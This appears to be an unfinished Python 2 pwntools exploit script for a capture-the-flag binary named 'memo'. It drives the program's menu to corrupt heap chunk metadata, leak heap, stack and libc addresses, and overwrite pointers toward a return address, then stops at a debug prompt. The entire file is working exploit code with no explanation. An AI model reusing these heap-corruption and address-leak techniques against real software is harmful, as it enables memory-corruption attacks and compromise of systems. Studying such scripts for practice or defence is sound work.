#!/usr/bin/env python2

from pwn import *

r = process("./memo")

def menu():
	r.recvuntil(">> ")

def create(pos, size, payload):
	menu()
	r.sendline("1")
	r.recvuntil("Index: ")
	r.sendline(str(pos))
	r.recvuntil("Length: ")
	r.sendline(str(size))
	r.recvuntil("Message: ")
	r.sendline(payload)

def edit(payload):
	menu()
	r.sendline("2")
	r.recvuntil("Edit message: ")
	r.sendline(payload)
	r.recvuntil("edited! this is edited message!\n")
	data = r.recvline()
	return data

def view(num):
	menu()
	r.sendline("3")
	r.recvuntil("Index: ")
	r.sendline(str(num))
	r.recvuntil("View Message: ")
	data = r.recvline()
	return data

def delete(num):
	menu()
	r.sendline("4")
	r.recvuntil("Index: ")
	r.sendline(str(num))
	r.recvuntil("Deleted!")

def change(pwd, payload):
	menu()
	r.sendline("5")
	r.recvuntil("Password: ")
	r.sendline(pwd)
	r.recvuntil("New user name: ")
	r.sendline("soez")
	r.recvuntil("New password: ")
	r.sendline(payload)
	r.recvline()

def quit():
	menu()
	r.sendline("6")
	r.recvuntil("good bye\n")

def main():
	r.recvuntil("What's user name: ")
	r.sendline("soez")
	r.recvuntil("Do you wanna set password? (y/n) ")
	r.sendline("y")
	r.recvuntil("Password must be set to 32 digits or less.\n")
	r.recvuntil("Password: ")
	r.sendline("AAAA")
	r.recvuntil("Done! have a good day soez") 

	create(0, 0x20, "")
	create(1, 0x20, "")	
	delete(1)
	delete(0)
	create(0, 0x20, "")
	leak_heap=u64(edit("")[:-1].ljust(8,"\x00"))
	log.info("Heap: 0x{:0x}" .format(leak_heap))
	change("AAAA", p64(0) + p64(0x31) + p64(0)*2 + "\xfc")
	edit(p64(0)*5 + p64(0x31) + p64(0x602a40))
	create(1, 0x20, "")
	create(2, 0x20, "")
	edit(p64(0)*2 + p64(0xfc)*2)
	edit(p64(0)*2 + p64(0xfc)*2 + p64(0x602a98) + p64(0x603010) + p64(0x602a50))
	p_stack = u64(view(0)[:-1].ljust(8, '\0'))
	p_ret = p_stack + 0x58 
	print "[+] stack 0x%x" % p_stack
	print "[+] ret 0x%x" % p_ret
	edit(p64(0)*2 + p64(0xfc)*2 + p64(0x603010) + p64(0x603040) + p64(p_ret))

	p_libc = u64(view(2)[:-1].ljust(8, '\0'))
	base_libc=p_libc - 0x20511
	
	print "[+] libc 0x%x" % p_libc
	raw_input("[DEBUG]")

if __name__ == '__main__':
	main()

